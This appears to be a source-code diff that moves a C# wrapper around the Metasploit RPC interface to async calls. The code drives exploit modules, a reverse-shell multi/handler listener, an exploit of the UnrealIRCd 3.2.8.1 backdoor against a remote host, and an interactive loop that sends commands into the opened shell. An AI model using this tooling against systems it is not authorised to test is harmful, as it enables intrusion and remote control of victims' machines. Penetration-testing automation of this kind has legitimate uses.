@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Threading.Tasks;
 using Lacey.Alexa.Common.Metasploit.Const;
 using Lacey.Alexa.Common.Metasploit.Models.Modules;
 using Lacey.Alexa.Common.Metasploit.Providers;
@@ -10,26 +11,25 @@ namespace Lacey.Alexa.Common.Metasploit.Extensions
 {
     public static class MetasploitProviderExtensions
     {
-        public static void ShellInteract(
+        public static async Task RunShell(
             this IMetasploitProvider metasploit,
             string sessionId)
         {
             while (true)
             {
                 var cmd = Console.ReadLine();
-                if (cmd == "exit")
+                if (cmd == Cmd.Exit)
                 {
-                    metasploit.StopSession(sessionId);
+                    await metasploit.StopSession(sessionId);
                     break;
                 }
 
-                metasploit.WriteToSessionShell(sessionId, $"{cmd}{Environment.NewLine}");
-                Delay.Small();
-                metasploit.ReadSessionShell(sessionId);
+                await metasploit.WriteToSessionShell(sessionId, $"{cmd}{Environment.NewLine}");
+                await metasploit.ReadSessionShell(sessionId);
             }
         }
 
-        public static object ShellExec(
+        public static async Task<object> SendCommandToShell(
             this IMetasploitProvider metasploit,
             Dictionary<string, object> shell,
             string command)
@@ -40,58 +40,56 @@ namespace Lacey.Alexa.Common.Metasploit.Extensions
                 var dict = (Dictionary<string, object>)value;
                 if (dict[ResultFields.Type] as string == ResultType.Shell)
                 {
-                    metasploit.WriteToSessionShell(id, $"{command}{Environment.NewLine}");
-                    Delay.Small();
-                    var response = metasploit.ReadSessionShell(id);
+                    await metasploit.WriteToSessionShell(id, $"{command}{Environment.NewLine}");
+                    Delay.Tiny();
+                    var response = await metasploit.ReadSessionShell(id);
                     result = response[ResultFields.Data];
-                    metasploit.StopSession(id);
+                    await metasploit.StopSession(id);
                 }
             }
 
             return result;
         }
 
-        public static Dictionary<string, object> ExecuteModule(
-            this IMetasploitProvider metasploit, 
-            MetasploitModule module,
-            out string jobId)
-        {
-            var response = metasploit.ExecuteModule(module.Type, module.Name, module.Options);
-            jobId = response[ResultFields.JobId].ToString();
-            return response;
-        }
-
-        public static Dictionary<string, object> ExecuteModule(
+        public static async Task<(Dictionary<string, object> Result, string JobId)> ExecuteModuleJob(
             this IMetasploitProvider metasploit, 
             MetasploitModule module)
         {
-            var response = metasploit.ExecuteModule(module.Type, module.Name, module.Options);
+            var response = await metasploit.ExecuteModule(module.Type, module.Name, module.Options);
+            var jobId = response[ResultFields.JobId].ToString();
+            return (response, jobId);
+        }
+
+        public static async Task<Dictionary<string, object>> ExecuteModule(
+            this IMetasploitProvider metasploit, 
+            MetasploitModule module)
+        {
+            var response = await metasploit.ExecuteModule(module.Type, module.Name, module.Options);
             return response;
         }
 
-        public static Dictionary<string, object> WaitModuleJob(
+        public static async Task<Dictionary<string, object>> WaitModuleJob(
             this IMetasploitProvider metasploit, 
             string moduleName,
             string jobId)
         {
-            var response = metasploit.ListJobs();
+            var response = await metasploit.ListJobs();
             var vals = new List<object>(response.Values);
             while (vals.Any(v => ((string)v).Contains(moduleName)))
             {
                 Delay.Small();
-                response = metasploit.ListJobs();
+                response = await metasploit.ListJobs();
                 vals = new List<object>(response.Values);
             }
 
-            metasploit.StopJob(jobId);
-            response = metasploit.ListSessions();
+            await metasploit.StopJob(jobId);
+            response = await metasploit.ListSessions();
 
             return response;
         }
 
-        public static Dictionary<string, object> MultiHandlerExec(
-            this IMetasploitProvider metasploit,
-            out string jobId)
+        public static async Task<(Dictionary<string, object> Result, string JobId)> MultiHandlerExec(
+            this IMetasploitProvider metasploit)
         {
             var module = new MetasploitModule(ModuleType.Exploit, ModuleNames.MultiHandler)
                 .LHost(metasploit.MetasploitAddress.ToString())
@@ -99,10 +97,10 @@ namespace Lacey.Alexa.Common.Metasploit.Extensions
                 .Payload(PayloadNames.CmdUnixReverse)
                 .ExitOnSession(false);
 
-            return metasploit.ExecuteModule(module, out jobId);
+            return await metasploit.ExecuteModuleJob(module);
         }
 
-        public static Dictionary<string, object> UnrealIrcd3281BackdoorExec(
+        public static async Task<Dictionary<string, object>> UnrealIrcd3281BackdoorExec(
             this IMetasploitProvider metasploit,
             string rHost)
         {
@@ -113,7 +111,7 @@ namespace Lacey.Alexa.Common.Metasploit.Extensions
                 .Payload(PayloadNames.CmdUnixReverse)
                 .DisablePayloadHandler(true);
 
-            return metasploit.ExecuteModule(module);
+            return await metasploit.ExecuteModule(module);
         }
     }
 }
